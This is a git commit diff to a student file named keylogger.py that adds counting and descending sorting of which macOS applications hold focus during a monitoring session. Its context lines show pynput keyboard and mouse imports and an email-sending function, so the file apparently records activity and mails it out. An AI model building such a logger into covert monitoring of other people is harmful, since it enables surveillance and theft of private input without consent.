8bb91bb627003107cc30695528f5b1a58002edc2
Sunny Chen <z5267282@student.unsw.edu.au>
2022-04-14 18:56:14 +1000

    Logging applications in descending order

--- keylogger.py
+++ keylogger.py
@@ -7,13 +7,21 @@ from email.mime.text import MIMEText
 from pynput import keyboard, mouse
 import smtplib
 
+
 """
-    EMAIL SENDING
+    MISCELLANEOUS
 """
 
 def timestamp():
     right_now = datetime.now()
     return right_now.strftime('%d/%m/%Y - %H:%M')
+
+def sort_dict_descending_keys(dictionary):
+    return sorted(dictionary.items(), key=lambda pair: pair[1], reverse=True)
+
+"""
+    EMAIL SENDING
+"""
 
 def construct_mime(email_address, contents):
     message = MIMEMultipart()
@@ -40,6 +48,7 @@ def send_email(email_address, password, contents):
 def get_focus_app_string():
     workspace = NSWorkspace.sharedWorkspace()
     return workspace.activeApplication()['NSApplicationName']
+
 
 """
     MONITORING
@@ -79,13 +88,19 @@ class Monitor:
             # Handle a newly seen app
             if prev is None or prev != app:
                 print(f"{timestamp()} - '{app}'")
+
                 if not app in apps:
                     apps[app] = 1
+                else:
+                    apps[app] += 1
+
                 prev = app
 
             app = get_focus_app_string()                
         
         print('Most used apps in session:')
+        for application, count in sort_dict_descending_keys(apps):
+            print(f"'{application}' : {count}")
 
 def main():
     monitor = Monitor()
